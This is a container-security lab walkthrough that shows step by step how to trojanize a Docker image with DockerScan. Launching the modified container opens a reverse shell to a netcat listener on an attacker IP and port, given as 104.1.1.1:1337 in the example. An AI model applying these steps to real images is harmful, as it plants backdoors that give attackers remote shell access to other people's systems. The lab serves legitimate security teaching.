# **Trojanized Docker Images - DockerScan**

### *A docker image can be trojanized with a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container*

-------

#### Step 1:

* Navigate to the `Trojanized Docker Images` directory

```commandline
cd /root/container-training/Container/Trojanized-Docker-Image/
```

* Install `dockerscan`

```commandline
export LC_CTYPE=en_US.UTF-8 && pip3 install dockerscan
```

* Pull and save the docker image that is to be trojanized

```commandline
docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest -o abhaybhargav-vul_flask
```

-------

#### Step 2:

* Set the necessary environment variables for `dockerscan` to run

```commandline
export LC_ALL=C.UTF-8

export LANG=C.UTF-8
```

* Fetch the IP of the provisioned server

```commandline
serverip
```

* Trojanize the saved docker to create a `.tar` file

```commandline
dockerscan image modify trojanize abhaybhargav-vul_flask -l <IP> -p <PORT> -o abhaybhargav-vul_flask-trojanized
```

**EXAMPLE**: `dockerscan image modify trojanize abhaybhargav-vul_flask -l 104.1.1.1 -p 1337 -o abhaybhargav-vul_flask-trojanized`

-------

#### Step 3:

* Once the command on **Step 2** has been run, a `netcat` command is returned. Run the command in another tab or use `tmux` to split the terminal.

```commandline
nc -v -k -l <IP> <PORT>
```

**EXAMPLE**: `nc -v -k -l 104.1.1.1 1337`

* Load the trojanized `.tar` docker file

```commandline
docker load -i abhaybhargav-vul_flask-trojanized.tar
```

-------

#### Step 4:

* Confirm that the trojanized image has been loaded

```commandline
docker images
```

* When the trojanized docker is run, the listener should have reverse-shell access to the container

```commandline
docker run -d -p 5000:5000 abhaybhargav/vul_flask
```

-------

#### Step 5:

* Stop/Close the `reverse-shell` tab

* Stop all containers

```commandline
clean-docker
```

---------

### Reading Material/References:

* https://github.com/cr0hn/dockerscan
